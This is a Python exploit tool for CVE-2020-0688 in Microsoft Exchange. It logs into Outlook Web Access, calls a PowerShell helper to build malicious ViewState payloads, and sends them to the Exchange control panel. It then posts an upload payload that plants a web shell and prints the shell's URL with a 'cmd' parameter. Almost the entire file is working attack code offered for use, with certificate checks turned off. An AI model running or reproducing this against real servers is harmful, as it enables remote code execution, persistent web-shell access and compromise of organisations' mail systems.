from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from urllib.parse import quote
import subprocess
import optparse
import requests
import urllib3
import sys
import re
import os

default = '\033[0m'
red = '\033[31m'
green = '\033[32m'
white = '\033[97m'

urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()
proxies = {"https": "127.0.0.1:8080"}
session.proxies = proxies
session.verify = False
os.system('cls')
session.headers[
    'User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36'


def option_parser():
    parser = optparse.OptionParser()
    parser.add_option('-s', dest='server', help='Exchange mail Server URL Example: http://ip/owa')
    parser.add_option('-u', dest='user', help=r'Login account Example: domain\user')
    parser.add_option('-p', dest='password', help=r'Password')
    (options, agrs) = parser.parse_args()
    if not options.server:
        parser.error(f'[{red}-{default}] Option "-s" - which is server url required.')
    elif not options.user:
        parser.error(f'[{red}-{default}] Option "-u" - which is user required.')
    elif not options.password:
        parser.error(f'[{red}-{default}] Option "-p" - password is required.')
    else:
        tmp = urlparse(options.server)
        server_url = f'{tmp.scheme}://{tmp.netloc}'
        return server_url, options.user, options.password


def get_login(base_url: str, user: str, password: str):
    params_post = {"password": "" + password + "", "isUtf8": "1", "passwordText": "", "trusted": "4",
                   "destination": "" + base_url + "", "flags": "4", "forcedownlevel": "0", "username": "" + user + ""}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
               "Connection": "close", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded", "Cookie": "PrivateComputer=true; PBack=0"}
    login_url = base_url + '/owa/auth.owa'
    print(f'[{white}*{default}] Login url: {login_url} - Trying to login')
    try:
        login = session.post(login_url, data=params_post, headers=headers)
        if "reason=" in login.text or "reason=" in login.url and "owaLoading" in login.text:
            print(f'[{red}-{default}] Username or Password is incorrect, please try again.')
            sys.exit(1)
    except Exception as e:
        print(f'[{red}-{default}] Login Error with error exception\n\t"{e}"')
        sys.exit(1)
    print(f'[{green}+{default}] {login.status_code} - Login successfully')
    session.get(base_url + '/owa/', allow_redirects=True)
    target_login = session.get(base_url + '/ecp/default.aspx')
    return headers


def get_data(xaml: str, uri: str) -> (str, str):
    output = subprocess.getoutput(f'powershell -Exec bypass .\\CVE-2020-0688.ps1 -xaml {xaml} -uri {uri}')
    result = re.search(r'__VIEWSTATEGENERATOR=[\n\r ]+(\w+)[\r\n]+__VIEWSTATE=[\r\n]+(.*)', output)
    return result.group(1), result.group(2)


def get_payload(base_url: str):
    generator, viewstate = get_data('NULL-File.xml', 'default')
    print(f'[{green}+{default}] Generated Payload:')
    print(f'[{white}*{default}] Sending payload...')
    print(f'{base_url}/ecp/default.aspx?__VIEWSTATEGENERATOR={generator}&__VIEWSTATE={quote(viewstate)}\n')
    respond = session.get(
        f'{base_url}/ecp/default.aspx?__VIEWSTATEGENERATOR={generator}&__VIEWSTATE={quote(viewstate)}')
    if respond.ok:
        print(f'[{green}+{default}] {respond.status_code} - Sent payload Successfully.')
    else:
        print(f'[{red}-{default}] {respond.status_code} - Sent Payload Failed')
        sys.exit(1)
    print(f'[{white}*{default}] Testing if "https://{base_url}/ecp/liveiderror.aspx" created')
    test_liveiderror(base_url)


def post_payload(base_url: str):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
               'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Dnt': '1',
               'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
               'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Te': 'trailers', 'Connection': 'close'}
    session.headers = headers
    session.get(base_url + '/ecp/default.aspx')
    print(f'[{white}*{default}] Creating payload data')
    generator, viewstate = get_data('Upload-Shell.xml', 'liveiderror')
    print(
        f'\nContent-type: application/x-www-form-urlencoded\n\n__VIEWSTATEGENERATOR={generator}&__VIEWSTATE={viewstate}')
    print(f'[{green}+{default}] Created payload successfully')
    print(f'[{white}*{default}] Posting your data:')
    headers.update({'Content-type': 'application/x-www-form-urlencoded'})
    data = {'__VIEWSTATEGENERATOR': generator, '__VIEWSTATE': viewstate}
    session.headers.update({'Content-type': 'application/x-www-form-urlencoded'})
    respond = session.post(f'{base_url}/ecp/liveiderror.aspx', data=data)
    if respond.ok:
        print(f'[{green}+{default}] {respond.status_code} - Posted shell done')
    else:
        print(f'[{red}-{default}] {respond.status_code} - Could not upload your shell!')
        sys.exit(1)
    print(f'[{white}*{default}] Testing if shell is worked')
    file = open('Upload-Shell.xml', 'r').read()
    path = re.search(r'<s:String>ClientAccess(\\{2}Autodiscover\\{2}\w+.aspx)</s:String>', file).group(1).replace('\\\\','/')
    print(f'[{green}+{default}] Your shell spot at: {base_url}{path}?cmd=')


def test_liveiderror(base_url: str):
    base_url = base_url + '/ecp/liveiderror.aspx'
    respond = session.get(base_url)
    if respond.ok:
        print(f'[{green}+{default}] {respond.status_code} - Created LiveIdError: https://{base_url}')
    else:
        print(f'[{red}-{default}] {respond.status_code} - Failed to create liveIdError.aspx')
        sys.exit(1)


if __name__ == '__main__':
    base_url, user, password = option_parser()
    headers = get_login(base_url, user, password)
    get_payload(base_url)
    post_payload(base_url)
